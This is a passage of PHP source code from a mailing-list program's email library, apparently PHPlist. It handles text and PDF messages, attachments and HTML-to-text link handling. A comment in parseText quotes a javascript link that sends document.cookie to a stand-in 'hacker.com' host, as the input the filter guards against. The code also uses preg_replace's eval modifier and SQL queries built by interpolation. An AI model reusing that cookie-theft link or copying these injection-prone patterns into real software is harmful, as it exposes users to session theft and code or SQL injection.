            $contents = fread($fp,filesize($pdffile));
            fclose($fp);
           unlink($pdffile);
           $html = '<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
              <html>
              <head>
                <title></title>
              </head>
              <body>
              <embed src="message.pdf" width="450" height="450" href="message.pdf"></embed>
              </body>
              </html>';
#            $mail->add_html($html,$textmessage);
#            $mail->add_text($textmessage);
            $mail->add_attachment($contents,
              "message.pdf",
              "application/pdf");
          }
        }
        addAttachments($messageid,$mail,"HTML");
      } else {
        Sql_Query("update {$GLOBALS["tables"]["message"]} set astext = astext + 1 where id = $messageid");
        $mail->add_text($textmessage);
        addAttachments($messageid,$mail,"text");
      }
      break;
    case "text and PDF":
      if (ENABLE_RSS && sizeof($rssitems))
        updateRSSStats($rssitems,"astext");
      # send a PDF file to users who want html and text to everyone else
      if ($htmlpref) {
        Sql_Query("update {$GLOBALS["tables"]["message"]} set astextandpdf = astextandpdf + 1 where id = $messageid");
        $pdffile = createPdf($textmessage);
        if (is_file($pdffile) && filesize($pdffile)) {
          $fp = fopen($pdffile,"r");
          if ($fp) {
            $contents = fread($fp,filesize($pdffile));
            fclose($fp);
            unlink($pdffile);
           $html = '<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
              <html>
              <head>
                <title></title>
              </head>
              <body>
              <embed src="message.pdf" width="450" height="450" href="message.pdf"></embed>
              </body>
              </html>';
 #           $mail->add_html($html,$textmessage);
             $mail->add_text($textmessage);
            $mail->add_attachment($contents,
              "message.pdf",
              "application/pdf");
          }
        }
        addAttachments($messageid,$mail,"HTML");
      } else {
        Sql_Query("update {$GLOBALS["tables"]["message"]} set astext = astext + 1 where id = $messageid");
        $mail->add_text($textmessage);
        addAttachments($messageid,$mail,"text");
      }
      break;
    case "text":
    default:
      # send as text
      if (ENABLE_RSS && sizeof($rssitems))
        updateRSSStats($rssitems,"astext");
      Sql_Query("update {$GLOBALS["tables"]["message"]} set astext = astext + 1 where id = $messageid");
       $mail->add_text($textmessage);
      addAttachments($messageid,$mail,"text");
      break;
  }
  $mail->build_message(
      array(
        "html_charset" => $cached[$messageid]["html_charset"],
        "html_encoding" => HTMLEMAIL_ENCODING,
        "text_charset" => $cached[$messageid]["text_charset"],
        "text_encoding" => TEXTEMAIL_ENCODING)
      );


  if (!TEST) {
    if ($hash != 'forwarded' || !sizeof($forwardedby)) {
      $fromname = $cached[$messageid]["fromname"];
      $fromemail = $cached[$messageid]["fromemail"];
      $subject = $cached[$messageid]["subject"];
    } else {
      $fromname = '';
      $fromemail = $forwardedby['email'];
      $subject = $GLOBALS['strFwd'].': '.$cached[$messageid]["subject"];
    }

    if (!$mail->send("", $destinationemail, $fromname, $fromemail, $subject)) {
      logEvent("Error sending message $messageid to $email ($destinationemail)");
      return 0;
    } else {
      return 1;
    }
  }
  return 0;
}

function addAttachments($msgid,&$mail,$type) {
  global $attachment_repository,$website;
  if (ALLOW_ATTACHMENTS) {
    $req = Sql_Query("select * from {$GLOBALS["tables"]["message_attachment"]},{$GLOBALS["tables"]["attachment"]}
      where {$GLOBALS["tables"]["message_attachment"]}.attachmentid = {$GLOBALS["tables"]["attachment"]}.id and
      {$GLOBALS["tables"]["message_attachment"]}.messageid = $msgid");
    if (!Sql_Affected_Rows())
      return;
    if ($type == "text") {
      $mail->append_text($GLOBALS["strAttachmentIntro"]."\n");
    }

    while ($att = Sql_Fetch_array($req)) {
      switch ($type) {
        case "HTML":
          if (is_file($GLOBALS["attachment_repository"]."/".$att["filename"]) && filesize($GLOBALS["attachment_repository"]."/".$att["filename"])) {
            $fp = fopen($GLOBALS["attachment_repository"]."/".$att["filename"],"r");
            if ($fp) {
              $contents = fread($fp,filesize($GLOBALS["attachment_repository"]."/".$att["filename"]));
              fclose($fp);
              $mail->add_attachment($contents,
                basename($att["remotefile"]),
                $att["mimetype"]);
            }
          } elseif (is_file($att["remotefile"]) && filesize($att["remotefile"])) {
            # handle local filesystem attachments
            $fp = fopen($att["remotefile"],"r");
            if ($fp) {
              $contents = fread($fp,filesize($att["remotefile"]));
              fclose($fp);
              $mail->add_attachment($contents,
                basename($att["remotefile"]),
                $att["mimetype"]);
              list($name,$ext) = explode(".",basename($att["remotefile"]));
              # create a temporary file to make sure to use a unique file name to store with
              $newfile = tempnam($GLOBALS["attachment_repository"],$name);
              $newfile .= ".".$ext;
              $newfile = basename($newfile);
              $fd = fopen( $GLOBALS["attachment_repository"]."/".$newfile, "w" );
              fwrite( $fd, $contents );
              fclose( $fd );
              # check that it was successful
              if (filesize($GLOBALS["attachment_repository"]."/".$newfile)) {
                Sql_Query(sprintf('update %s set filename = "%s" where id = %d',
                  $GLOBALS["tables"]["attachment"],$newfile,$att["attachmentid"]));
              } else {
                # now this one could be sent many times, so send only once per run
                if (!isset($GLOBALS[$att["remotefile"]."_warned"])) {
                  logEvent("Unable to make a copy of attachment ".$att["remotefile"]." in repository");
                  $msg = "Error, when trying to send message $msgid the filesystem attachment
                    ".$att["remotefile"]." could not be copied to the repository. Check for permissions.";
                  sendMail(getConfig("report_address"),"Mail list error",$msg,"");
                  $GLOBALS[$att["remotefile"]."_warned"] = time();
                }
              }
            } else {
              logEvent("failed to open attachment ".$att["remotefile"]." to add to message $msgid ");
            }
          } else {
            logEvent("Attachment ".$att["remotefile"]." does not exist");
            $msg = "Error, when trying to send message $msgid the attachment
              ".$att["remotefile"]." could not be found";
            sendMail(getConfig("report_address"),"Mail list error",$msg,"");
          }
           break;

         case "text":
          $viewurl = $GLOBALS["scheme"]."://".$website.$GLOBALS["pageroot"].'/dl.php?id='.$att["id"];
          $mail->append_text($att["description"]."\n".$GLOBALS["strLocation"].": ".$viewurl."\n");
          break;
      }
    }
  }
}

function createPDF($text) {
  if (!isset($GLOBALS["pdf_font"])) {
    $GLOBALS["pdf_font"] = 'Arial';
    $GLOBALS["pdf_fontsize"] = 12;
   }
  $pdf=new FPDF();
  $pdf->SetCreator("PHPlist version ".VERSION);
  $pdf->Open();
  $pdf->AliasNbPages();
  $pdf->AddPage();
  $pdf->SetFont($GLOBALS["pdf_font"],$GLOBALS["pdf_fontstyle"],$GLOBALS["pdf_fontsize"]);
  $pdf->Write((int)$GLOBALS["pdf_fontsize"]/2,$text);
  $fname = tempnam($GLOBALS["tmpdir"],"pdf");
  $pdf->Output($fname,false);
  return $fname;
}

function replaceChars($text) {
// $document should contain an HTML document.
// This will remove HTML tags, javascript sections
// and white space. It will also convert some
// common HTML entities to their text equivalent.

$search = array ("'&(quot|#34);'i",  // Replace html entities
                 "'&(amp|#38);'i",
                 "'&(lt|#60);'i",
                 "'&(gt|#62);'i",
                 "'&(nbsp|#160);'i",
                 "'&(iexcl|#161);'i",
                 "'&(cent|#162);'i",
                 "'&(pound|#163);'i",
                 "'&(copy|#169);'i",
                 "'&#(\d+);'e");  // evaluate as php

$replace = array ("\"",
                  "&",
                  "<",
                  ">",
                  " ",
                  chr(161),
                  chr(162),
                  chr(163),
                  chr(169),
                  "chr(\\1)");

  $text = preg_replace ($search, $replace, $text);


  # eze
  # $text = html_entity_decode ( $text , ENT_QUOTES , $GLOBALS['strCharSet'] );
  $text = html_entity_decode ( $text , ENT_QUOTES , 'UTF-8' );

  return $text;
}

function mailto2href($text) {
  # converts <mailto:blabla> link to <a href="blabla"> links
  #~Bas 0008857
  $text = preg_replace("/(.*@.*\..*) *<mailto:(\\1[^>]*)>/Umis","[URLTEXT]\\1[ENDURLTEXT][LINK]\\2[ENDLINK]\n",$text);
  $text = preg_replace("/<mailto:(.*@.*\..*)(\?.*)?>/Umis","[URLTEXT]\\1[ENDURLTEXT][LINK]\\1\\2[ENDLINK]\n",$text);
  $text = preg_replace("/\[URLTEXT\](.*)\[ENDURLTEXT\]\[LINK\](.*)\[ENDLINK\]/Umis",'<a href="mailto:\\2">\\1</a>',$text);
  return $text;
};

function linkencode($p_url){
  # URL Encode only the 'variable' parts of links, not the slashes in the path or the @ in an email address
  # from http://ar.php.net/manual/nl/function.rawurlencode.php
  # improved to handle mailto links properly
  #~Bas 0008857

  $uparts = @parse_url($p_url);

  $scheme = array_key_exists('scheme',$uparts) ? $uparts['scheme'] : "";
  $pass = array_key_exists('pass',$uparts) ? $uparts['pass']  : "";
  $user = array_key_exists('user',$uparts) ? $uparts['user']  : "";
  $port = array_key_exists('port',$uparts) ? $uparts['port']  : "";
  $host = array_key_exists('host',$uparts) ? $uparts['host']  : "";
  $path = array_key_exists('path',$uparts) ? $uparts['path']  : "";
  $query = array_key_exists('query',$uparts) ? $uparts['query']  : "";
  $fragment = array_key_exists('fragment',$uparts) ? $uparts['fragment']  : "";
  
  if(!empty($scheme))
   if($scheme == "mailto") {
     $scheme .= ':';
   } else {
     $scheme .= '://';
   };
   
  if(!empty($pass) && !empty($user)) {
   $user = rawurlencode($user).':';
   $pass = rawurlencode($pass).'@';
   } elseif(!empty($user))
     $user .= '@';
  
  if(!empty($port) && !empty($host))
     $host = ''.$host.':';
  elseif(!empty($host))
     $host=$host;
  
  if(!empty($path)){
    $arr = preg_split("/([\/;=@])/", $path, -1, PREG_SPLIT_DELIM_CAPTURE); // needs php > 4.0.5.
    $path = "";
    foreach($arr as $var){
      switch($var){
        case "/":
        case ";":
        case "=":
        case "@":
        $path .= $var;
          break;
        default:
          $path .= rawurlencode($var);
      }
    }
    // legacy patch for servers that need a literal /~username
    $path = str_replace("/%7E","/~",$path);
  }
  
  if(!empty($query)){
    $arr = preg_split("/([&=])/", $query, -1, PREG_SPLIT_DELIM_CAPTURE); // needs php > 4.0.5.
    $query = "?";
    foreach($arr as $var){
      if( "&" == $var || "=" == $var )
        $query .= $var;
      else
        $query .= rawurlencode($var);
    }    
  }
  
  if(!empty($fragment))
    $fragment = '#'.urlencode($fragment);
  
  return implode('', array($scheme, $user, $pass, $host, $port, $path, $query, $fragment));
}

function encodeLinks($text) {
  #~Bas Find and properly encode all links.
  preg_match_all("/<a(.*)href=[\"\'](.*)[\"\']([^>]*)>/Umis", $text, $links);
  
  foreach ($links[0] as $matchindex => $fullmatch) {
    $linkurl = $links[2][$matchindex];
    $linkreplace = '<a' . $links[1][$matchindex] . ' href="' . linkencode($linkurl) . '"' . $links[3][$matchindex] .'>';
    $text = str_replace($fullmatch,$linkreplace,$text);
  }
  return $text;
}

function stripHTML($text) {

  # strip HTML, and turn links into the full URL
  $text = preg_replace("/\r/","",$text);

  #$text = preg_replace("/\n/","###NL###",$text);
  $text = preg_replace("/<script[^>]*>(.*?)<\/script\s*>/is","",$text);
  $text = preg_replace("/<style[^>]*>(.*?)<\/style\s*>/is","",$text);

  # would prefer to use < and > but the strip tags below would erase that.
#  $text = preg_replace("/<a href=\"(.*?)\"[^>]*>(.*?)<\/a>/is","\\2\n{\\1}",$text,100);

#  $text = preg_replace("/<a href=\"(.*?)\"[^>]*>(.*?)<\/a>/is","[URLTEXT]\\2[/URLTEXT][LINK]\\1[/LINK]",$text,100);

  $text = preg_replace("/<a[^>]*href=[\"\'](.*)[\"\'][^>]*>(.*)<\/a>/Umis","[URLTEXT]\\2[ENDURLTEXT][LINK]\\1[ENDLINK]\n",$text);

  $text = preg_replace("/<b>(.*?)<\/b\s*>/is","*\\1*",$text);
  $text = preg_replace("/<h[\d]>(.*?)<\/h[\d]\s*>/is","**\\1**\n",$text);
#  $text = preg_replace("/\s+/"," ",$text);
  $text = preg_replace("/<i>(.*?)<\/i\s*>/is","/\\1/",$text);
  $text = preg_replace("/<\/tr\s*?>/i","<\/tr>\n\n",$text);
  $text = preg_replace("/<\/p\s*?>/i","<\/p>\n\n",$text);
  $text = preg_replace("/<br[^>]*?>/i","<br>\n",$text);
  $text = preg_replace("/<br[^>]*?\/>/i","<br\/>\n",$text);
  $text = preg_replace("/<table/i","\n\n<table",$text);
  $text = strip_tags($text);

  # find all URLs and replace them back
  preg_match_all('~\[URLTEXT\](.*)\[ENDURLTEXT\]\[LINK\](.*)\[ENDLINK\]~Umis', $text, $links);
  foreach ($links[0] as $matchindex => $fullmatch) {
    $linktext = $links[1][$matchindex];
    $linkurl = $links[2][$matchindex];
    # check if the text linked is a repetition of the URL
    if (trim($linktext) == trim($linkurl) ||
      'http://'.trim($linktext) == trim($linkurl)) {
        $linkreplace = $linkurl;
    } else {
      $linkreplace = $linktext.' <'.$linkurl.'>';
    }
  #  $text = preg_replace('~'.preg_quote($fullmatch).'~',$linkreplace,$text);
    $text = str_replace($fullmatch,$linkreplace,$text);
  }
  $text = preg_replace("/<a href=[\"\'](.*?)[\"\'][^>]*>(.*?)<\/a>/is","[URLTEXT]\\2[ENDURLTEXT][LINK]\\1[ENDLINK]",$text,500);

  $text = replaceChars($text);

  $text = preg_replace("/###NL###/","\n",$text);
  # reduce whitespace
  while (preg_match("/  /",$text))
    $text = preg_replace("/  /"," ",$text);
  while (preg_match("/\n\s*\n\s*\n/",$text))
    $text = preg_replace("/\n\s*\n\s*\n/","\n\n",$text);
  $text = wordwrap($text,70);

  return $text;
}

function parseText($text) {
  # bug in PHP? get rid of newlines at the beginning of text
  $text = ltrim($text);

  # make urls and emails clickable
  $text = eregi_replace("([\._a-z0-9-]+@[\.a-z0-9-]+)",'<a href="mailto:\\1" class="email">\\1</a>',$text);
  $link_pattern="/(.*)<a.*href\s*=\s*\"(.*?)\"\s*(.*?)>(.*?)<\s*\/a\s*>(.*)/is";

  $i=0;
  while (preg_match($link_pattern, $text, $matches)){
    $url=$matches[2];
    $rest = $matches[3];
    if (!preg_match("/^(http:)|(mailto:)|(ftp:)|(https:)/i",$url)){
      # avoid this
      #<a href="javascript:window.open('http://hacker.com?cookie='+document.cookie)">
      $url = preg_replace("/:/","",$url);
    }
    $link[$i]= '<a href="'.$url.'" '.$rest.'>'.$matches[4].'</a>';
    $text = $matches[1]."%%$i%%".$matches[5];
    $i++;
  }

  $text = preg_replace("/(www\.[a-zA-Z0-9\.\/#~:?+=&%@!_\\-]+)/i", "http://\\1"  ,$text);#make www. -> http://www.
  $text = preg_replace("/(https?:\/\/)http?:\/\//i", "\\1"  ,$text);#take out duplicate schema
  $text = preg_replace("/(ftp:\/\/)http?:\/\//i", "\\1"  ,$text);#take out duplicate schema
  $text = preg_replace("/(https?:\/\/)(?!www)([a-zA-Z0-9\.\/#~:?+=&%@!_\\-]+)/i", "<a href=\"\\1\\2\" class=\"url\" target=\"_blank\">\\2</a>"  ,$text); #eg-- http://kernel.org -> <a href"http://kernel.org" target="_blank">http://kernel.org</a>

  $text = preg_replace("/(https?:\/\/)(www\.)([a-zA-Z0-9\.\/#~:?+=&%@!\\-_]+)/i", "<a href=\"\\1\\2\\3\" class=\"url\" target=\"_blank\">\\2\\3</a>"  ,$text); #eg -- http://www.google.com -> <a href"http://www.google.com" target="_blank">www.google.com</a>

  # take off a possible last full stop and move it outside
  $text = preg_replace("/<a href=\"(.*?)\.\" class=\"url\" target=\"_blank\">(.*)\.<\/a>/i","<a href=\"\\1\" class=\"url\" target=\"_blank\">\\2</a>."   ,$text);

  for ($j = 0;$j<$i;$j++) {
    $replacement = $link[$j];
    $text = preg_replace("/\%\%$j\%\%/",$replacement, $text);
  }

  # hmm, regular expression choke on some characters in the text
  # first replace all the brackets with placeholders.
  # we cannot use htmlspecialchars or addslashes, because some are needed

  $text = ereg_replace("\(","<!--LB-->",$text);
  $text = ereg_replace("\)","<!--RB-->",$text);
  $text = preg_replace('/\$/',"<!--DOLL-->",$text);

  # @@@ to be xhtml compabible we'd have to close the <p> as well
  # so for now, just make it two br/s, which will be done by replacing
  # \n with <br/>
#  $paragraph = '<p>';
  $br = '<br />';
  $text = ereg_replace("\r","",$text);
#  $text = ereg_replace("\n\n","\n".$paragraph,$text);
  $text = ereg_replace("\n","$br\n",$text);

  # reverse our previous placeholders
  $text = ereg_replace("<!--LB-->","(",$text);
  $text = ereg_replace("<!--RB-->",")",$text);
  $text = ereg_replace("<!--DOLL-->","\$",$text);
  return $text;
}

function addHTMLFooter($message,$footer) {
  if (preg_match('#</body>#imUx',$message)) {
    $message = preg_replace('#</body>#',$footer.'</body>',$message);
  } else {
    $message .= $footer;
  }
  return $message;
}

# make sure the 0 template has the powered by image
Sql_Query(sprintf('select * from %s where filename = "%s" and template = 0',
  $GLOBALS["tables"]["templateimage"],"powerphplist.png"));
if (!Sql_Affected_Rows())
  Sql_Query(sprintf('insert into %s (template,mimetype,filename,data,width,height)
  values(0,"%s","%s","%s",%d,%d)',
  $GLOBALS["tables"]["templateimage"],"image/png","powerphplist.png",
  $newpoweredimage,
  70,30));


?>


